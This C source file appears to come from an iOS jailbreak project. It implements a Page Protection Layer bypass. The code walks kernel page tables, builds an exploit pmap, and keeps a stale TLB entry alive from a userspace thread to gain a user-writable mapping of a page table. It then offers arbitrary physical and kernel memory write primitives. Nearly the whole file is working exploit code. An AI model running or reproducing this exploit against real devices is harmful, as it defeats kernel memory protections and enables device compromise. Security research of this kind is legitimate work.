//
//  tlbFail.c
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#include "tlbFail.h"

#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>

#include "includeme.h"
#include "offsets.h"
#include "kernrw_alloc.h"
#include "physrw.h"
#include "virtrw.h"
#include "kernel.h"
#include "xprr.h"
#include "badRecovery.h"

volatile uint64_t gBypassReady = 0;
volatile uint64_t gBypassDone  = 0;
uint64_t gMagicPPLMap   = 0;
uint64_t *gMagicPPLPage = NULL;

uint64_t pmap_lv1(uint64_t pmap, uint64_t virt) {
    uint64_t ttep = kread64(pmap + 0x8ULL);
    
    uint64_t table1Off   = (virt >> 36ULL) & 0x7ULL;
    uint64_t table1Entry = rp64(ttep + (8ULL * table1Off));
    
    return table1Entry;
}

uint64_t pmap_lv2(uint64_t pmap, uint64_t virt) {
    uint64_t ttep = kread64(pmap + 0x8ULL);
    
    uint64_t table1Off   = (virt >> 36ULL) & 0x7ULL;
    uint64_t table1Entry = rp64(ttep + (8ULL * table1Off));
    guard ((table1Entry & 0x3) == 3) else {
        return 0;
    }
    
    uint64_t table2 = table1Entry & 0xFFFFFFFFC000ULL;
    uint64_t table2Off = (virt >> 25ULL) & 0x7FFULL;
    uint64_t table2Entry = rp64(table2 + (8ULL * table2Off));
    
    return table2Entry;
}

uint64_t pmap_lv3(uint64_t pmap, uint64_t virt) {
    uint64_t ttep = kread64(pmap + 0x8ULL);
    
    return translateAddr_inTTEP(ttep, virt);
}

uint64_t pmapFirstFree(uint64_t pmap, uint64_t start) {
    start = start & ~0x3FFFULL;
    
    while (1) {
        if (pmap_lv2(pmap, start) && !pmap_lv3(pmap, start)) {
            return start;
        }
        
        start += 0x4000ULL;
    }
}

#define CREATE_PMAP() kcall(pmap_create_options, 0 /* ledger */, 0 /* size */, 0x1 /* flags */, 0, 0, 0, 0, 0)

bool pplBypass(void) {
    uint64_t pagePhys = pmap_alloc_page_for_kern();
    guard (pagePhys != 0) else {
        puts("[-] pplBypass: Failed to alloc PPL page!");
        return false;
    }

    DBGPRINT_ADDRVAR(pagePhys);
    
    uint64_t pmap_create_options = SLIDE(gOffsets.pmap_create_options);
    
    uint64_t vmMap = TASK_VM_MAP(gOurTask);
    guard (vmMap != 0) else {
        puts("[-] pplBypass: Failed to find vmMap!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(vmMap);

    uint64_t ourPmap = VM_MAP_PMAP(vmMap);
    guard (ourPmap != 0) else {
        puts("[-] pplBypass: Failed to find our pmap!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(ourPmap);
    
    uint64_t ourTtep = PMAP_TTEP(ourPmap);
    guard (ourTtep != 0) else {
        puts("[-] pplBypass: Failed to find our ttep!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(ourTtep);
    
    uint64_t ourNestedMap = PMAP_NESTED_PMAP(ourPmap);
    guard (ourNestedMap != 0) else {
        puts("[-] pplBypass: Failed to find our nested pmap!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(ourNestedMap);
    
    uint64_t ourNestedAddr = PMAP_NESTED_ADDR(ourPmap);
    guard (ourNestedAddr != 0) else {
        puts("[-] pplBypass: Failed to find our nested address start!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(ourNestedAddr);
    
    uint64_t ourNestedSize = PMAP_NESTED_SIZE(ourPmap);
    guard (ourNestedSize != 0) else {
        puts("[-] pplBypass: Failed to find our nested size!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(ourNestedSize);
    
    uint64_t firstFree = pmapFirstFree(ourPmap, ourNestedAddr);
    guard (firstFree >= ourNestedAddr && firstFree < (ourNestedAddr + ourNestedSize)) else {
        puts("[-] pplBypass: Failed to find empty address in nested map!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(firstFree);
    
    // Create exploit pmap
    uint64_t exploitPmap = CREATE_PMAP();
    guard (exploitPmap != 0) else {
        puts("[-] pplBypass: Failed to create exploitPmap!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(exploitPmap);
    
    // Nest shared map into exploit pmap
    kern_return_t kr = pmap_nest(exploitPmap, ourNestedMap, ourNestedAddr, ourNestedSize);
    guard (kr == KERN_SUCCESS) else {
        printf("[-] pplBypass: Failed to nest! [%p]\n", (void*)(uint64_t) kr);
        return false;
    }
    
    puts("[+] pplBypass: Nest succeded!");
    
    // Map this page into our exploit pmap
    // Should also be visible for us
    kr = pmap_enter_options_addr(exploitPmap, pagePhys, firstFree);
    guard (kr == KERN_SUCCESS) else {
        printf("[-] pplBypass: Failed to map pagePhys! [%p]\n", (void*)(uint64_t) kr);
        return false;
    }
    
    // Set fault handler
    //void (*setFaultHandler)(uint64_t faultHandler) = (void(*)(uint64_t)) DBG_SET_FAULT_HNDLR;
    //setFaultHandler((uint64_t) ptrauth_strip(ppl_done, ptrauth_key_function_pointer));
    
    // Create target page
    uint64_t page_R_va   = 0x318000000;
    vm_address_t vm_addr = page_R_va;
    
    kr = vm_allocate(mach_task_self(), &vm_addr, 0x4000, VM_FLAGS_FIXED);
    if (kr != KERN_SUCCESS) {
        page_R_va = 0x2CC000000; // If first address failed, try this one, works on some devices where the first one does not
        vm_addr = page_R_va;
        kr = vm_allocate(mach_task_self(), &vm_addr, 0x4000, VM_FLAGS_FIXED);
    }

    guard (kr == KERN_SUCCESS) else {
        puts("[-] pplBypass: Failed to allocate fixed!");
        return false;
    }
    
    uint64_t pteEntry = pagePhys | PERM_TO_PTE(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY;
    
    // Keep the TLB for that page alive
    kRegisterState tlbKeeperState;
    tlbKeeperState.x[0] = pteEntry;                 // Value to write
    tlbKeeperState.x[1] = firstFree + 0x2000ULL;    // Write to our magic page
    tlbKeeperState.x[2] = (uint64_t) &gBypassDone;  // Done variable
    tlbKeeperState.x[3] = (uint64_t) &gBypassReady; // Ready variable
    
    tlbKeeperState.pc = (uint64_t) ptrauth_strip(ppl_loop, ptrauth_key_function_pointer);
    tlbKeeperState.cpsr = CPSR_USER_INTR_DIS;
    
    thread_t userspaceExploitThread = 0;
    kexec_on_new_thread(&tlbKeeperState, &userspaceExploitThread);
    
    uint64_t *ptr = (uint64_t*) firstFree;
    printf("Content: %p\n", (void*) *ptr);
    
    while (!gBypassReady) {
        ;
    }
    
    pmap_remove(exploitPmap, firstFree, firstFree + 0x4000ULL);
    pmap_mark_page_as_ppl_page(pagePhys);
    
    // Reclaim page
    *(uint64_t *)page_R_va = 0xeeeeffff;
    
    // We're done
    gBypassDone = 1;
    
    // Halt exploit thread
    thread_suspend(userspaceExploitThread);
    thread_abort(userspaceExploitThread);
    thread_terminate(userspaceExploitThread);
    
    // The phys page should map itself at entry 1024
    uint64_t *magic = (uint64_t*) (page_R_va + 0x1000000ULL);
    
    // Verify by reading from the page
    guard (magic[1024] == pteEntry) else {
        puts("[-] pplBypass: Failed to map level3 translation table!");
        return false;
    }
    
    puts("[+] PPL bypass succeded!!!");
    
    gMagicPPLMap  = page_R_va;
    gMagicPPLPage = magic;
    
    return true;
}

void* getPhysMapWindow(uint64_t phys) {
    phys &= 0xFFFFFFFFC000ULL;
    
    // First check if already mapped somewhere
    uint64_t *entry = NULL;
    void *entryVA   = NULL;
    for (size_t i = 0; i < 2048; i++) {
        uint64_t val = gMagicPPLPage[i] & 0xFFFFFFFFC000ULL;
        if (val == phys) {
            return (void*) (gMagicPPLMap + (i << 14ULL));
        } else if (entry == NULL && val == 0) {
            entry   = &gMagicPPLPage[i];
            entryVA = (void*) (gMagicPPLMap + (i << 14ULL));
        }
    }
    
    // Not mapped?
    if (entry) {
        *entry = phys | PERM_TO_PTE(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY;
        return entryVA;
    }
    
    return NULL;
}

bool physwrite_PPL(uint64_t addr, void *buf, size_t len) {
    uint8_t *buffer = (uint8_t*) buf;
    
    while (len) {
        uint64_t page   = addr & ~0x3FFFULL;
        uint64_t off    = addr & 0x3FFFULL;
        uint64_t curLen = 0x4000ULL - off;
        if (len < curLen) {
            curLen = len;
        }
        
        uint8_t *mapped = (uint8_t*) getPhysMapWindow(page);
        guard (mapped != NULL) else {
            return false;
        }
        
        memcpy(mapped + off, buffer, curLen);
        
        addr   += curLen;
        buffer += curLen;
        len    -= curLen;
    }
    
    return true;
}

bool kernwrite_PPL(uint64_t addr, void *buf, size_t len) {
    uint8_t *buffer = (uint8_t*) buf;
    
    while (len) {
        uint64_t page   = addr & ~0x3FFFULL;
        uint64_t off    = addr & 0x3FFFULL;
        uint64_t curLen = 0x4000ULL - off;
        if (len < curLen) {
            curLen = len;
        }
        
        uint64_t phys = translateAddr(page);
        guard (phys != 0) else {
            return false;
        }
        
        uint8_t *mapped = (uint8_t*) getPhysMapWindow(phys);
        guard (mapped != NULL) else {
            return false;
        }
        
        memcpy(mapped + off, buffer, curLen);
        
        addr   += curLen;
        buffer += curLen;
        len    -= curLen;
    }
    
    return true;
}
